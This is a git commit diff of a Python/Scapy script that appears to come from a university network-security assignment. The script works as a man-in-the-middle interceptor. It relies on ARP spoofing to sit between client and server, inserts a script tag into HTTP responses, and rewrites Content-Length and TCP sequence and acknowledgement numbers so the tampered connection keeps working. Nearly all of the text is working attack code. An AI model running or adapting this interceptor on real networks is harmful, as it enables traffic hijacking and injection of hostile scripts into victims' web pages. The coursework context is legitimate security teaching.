0f44ff8445b23864787cba6d4c26a4830031b932
yhyuan2 <yhyuan2@illinois.edu>
2019-11-05 18:12:06 -0600

    Diff between seq of 2nd response and ack of FA does not match load size

--- NetSec/cp2.1.http.py
+++ NetSec/cp2.1.http.py
@@ -59,66 +59,93 @@ def interceptor(packet):
 	
 	payload = '<script>' + script + '</script>'
 	if packet.haslayer(IP) and packet[Ether].dst == attackerMAC:
-		if packet[IP].src == serverIP and packet[IP].dst == clientIP:
-			if packet[IP].haslayer(Raw):
-				httpLoad = packet[Raw].load.decode('utf-8')
-				httpLoad = httpLoad.replace('</body>', payload + '</body>')
-				try:
-					loadSubString = httpLoad.split()
-					index = loadSubString.index('Content-Length:')
-					length = int(loadSubString[index+1])
-					portLength[packet[TCP].dport] = length
-					newLength = length + len(payload)
-					if newLength > 200:
-						print("# Response")
-						print(f"length: {length}")
-						print(f"new: {newLength}")
-						print(f"flags: {packet[IP].flags}")
-						print(f"sport: {packet[TCP].sport}")
-						print(f"dport: {packet[TCP].dport}")
-						print(f"seq: {packet[TCP].seq}")
-						print(f"ack: {packet[TCP].ack}")
-						#print(httpLoad)
-					httpLoad = httpLoad.replace('Content-Length: ' + str(length), 'Content-Length: ' + str(newLength))
-					#print(httpLoad)
-				except ValueError:
-					pass
-				packet[Raw].load = httpLoad.encode('utf-8')
-				del packet[IP].len
-				del packet[IP].chksum
-				del packet[TCP].chksum
-			packet[Ether].src = attackerMAC
-			packet[Ether].dst = clientMAC
-			frags = fragment(packet, fragsize = 500)
-			for frag in frags:
-				#frag.show2()
-				sendp(frag)
-		elif packet[IP].src == clientIP and packet[IP].dst == serverIP:
-			if packet.haslayer(Raw):
-				httpLoad = packet[Raw].load.decode('utf-8')
-				loadSubString = httpLoad.split()
+		if packet[IP].src == clientIP and packet[IP].dst == serverIP:
+			# Request from client to server
+			if packet.haslayer(TCP):
 				if packet[TCP].sport in portLength:
-					packet[TCP].ack = packet[TCP].ack - len(payload)
-					lenDiff = len(str(len(payload)+portLength[packet[TCP].sport])) - len(str(portLength[packet[TCP].sport]))
-					packet[TCP].ack = packet[TCP].ack - lenDiff
-					portLength.pop(packet[TCP].sport)
-				try:
-					index = loadSubString.index('GET')
-					path = loadSubString[index+1]
-					if path == '/long.html':
-						print("# Request")
-						print(f"path: {path}")
-						print(f"sport: {packet[TCP].sport}")
-						print(f"dport: {packet[TCP].dport}")
-						print(f"seq: {packet[TCP].seq}")
-						print(f"ack: {packet[TCP].ack}")
-				except ValueError:
-					pass
+					# Change ackowledgement number to what server wants to see.
+					# Record ackowledgement number from the request.
+					portLength[packet[TCP].sport][0] = packet[TCP].ack
+					for index, element in enumerate(portLength[packet[TCP].sport]):
+						if index > 0:
+							packet[TCP].ack = packet[TCP].ack - element
+					#packet[TCP].ack = packet[TCP].ack - portLength[packet[TCP].sport][1]
+				if packet[TCP].flags != "FA":
+					print("# Request")
+					print(f"\tflags: {packet[TCP].flags}")
+				if packet[TCP].flags == "FA" and packet[TCP].sport in portLength:
+					# Close TCP connection and hange ackowledgement number
+					# to what server wants to see.
+					print("# Finish")
+					print(f"\tflags: {packet[TCP].flags}")
+					portLength[packet[TCP].sport][0] = packet[TCP].ack
+					for index, element in enumerate(portLength[packet[TCP].sport]):
+						if index > 0:
+							packet[TCP].ack = packet[TCP].ack - element
+					#packet[TCP].ack = packet[TCP].ack - portLength[packet[TCP].sport][1]
+				print(f"\tsrc: {packet[TCP].sport}")
+				print(f"\tseq: {packet[TCP].seq}")
+				print(f"\tack: {packet[TCP].ack}")
+				if packet[TCP].sport in portLength:
+					print(f"\t{packet[TCP].sport}:{portLength[packet[TCP].sport]}")
 				del packet[IP].len
 				del packet[IP].chksum
 				del packet[TCP].chksum
 			packet[Ether].src = attackerMAC
 			packet[Ether].dst = serverMAC
+			frags = fragment(packet, fragsize = 500)
+			for frag in frags:
+				sendp(frag)
+		elif packet[IP].src == serverIP and packet[IP].dst == clientIP:
+			# Response from server to client
+			if packet.haslayer(Raw):
+				# Add payload.
+				httpLoad = packet[Raw].load.decode('utf-8')
+				httpLoad = httpLoad.replace('</body>', payload + '</body>')
+				if packet[TCP].dport in portLength:
+					# Change sequence number to what client wants to see.
+					packet[TCP].seq = portLength[packet[TCP].dport][0]
+				try:
+					# Change content length in http header.
+					loadSubString = httpLoad.split()
+					index = loadSubString.index('Content-Length:')
+					length = int(loadSubString[index+1])
+					newLength = length + len(payload)
+					lenDiff = len(payload) + len(str(newLength)) - len(str(length))
+					if packet[TCP].dport in portLength:
+						# Change sequence number to what client wants to see.
+						# Record original content length of http load, length difference and
+						# increment number of responses.
+						packet[TCP].seq = portLength[packet[TCP].dport][0]
+						portLength[packet[TCP].dport].append(lenDiff)
+					else:
+						# Record original content length of http load, length difference and
+						# first response.
+						portLength[packet[TCP].dport] = [0, lenDiff]
+					httpLoad = httpLoad.replace('Content-Length: ' + str(length), 'Content-Length: ' + str(newLength))
+				except:
+					pass
+				packet[Raw].load = httpLoad.encode('utf-8')
+				del packet[IP].len
+				del packet[IP].chksum
+				del packet[TCP].chksum
+			elif packet.haslayer(TCP):
+				if packet[TCP].dport in portLength:
+					# Change sequence number to what client wants to see.
+					packet[TCP].seq = portLength[packet[TCP].dport][0]
+				del packet[IP].len
+				del packet[IP].chksum
+				del packet[TCP].chksum
+			if packet.haslayer(TCP):
+				print("# Response")
+				print(f"\tflags: {packet[TCP].flags}")
+				print(f"\tdst: {packet[TCP].dport}")
+				print(f"\tseq: {packet[TCP].seq}")
+				print(f"\tack: {packet[TCP].ack}")
+			if packet[TCP].dport in portLength:
+				print(f"\t{packet[TCP].dport}:{portLength[packet[TCP].dport]}")
+			packet[Ether].src = attackerMAC
+			packet[Ether].dst = clientMAC
 			frags = fragment(packet, fragsize = 500)
 			for frag in frags:
 				sendp(frag)
@@ -142,6 +169,7 @@ if __name__ == "__main__":
 	serverMAC = mac(serverIP)
 	attackerMAC = get_if_hwaddr(args.interface)
 	
+	# dictionary of [ack from request, 1st lenDiff, 2nd lenDiff, ...]
 	portLength = {}
 
 	# start a new thread to ARP spoof in a loop
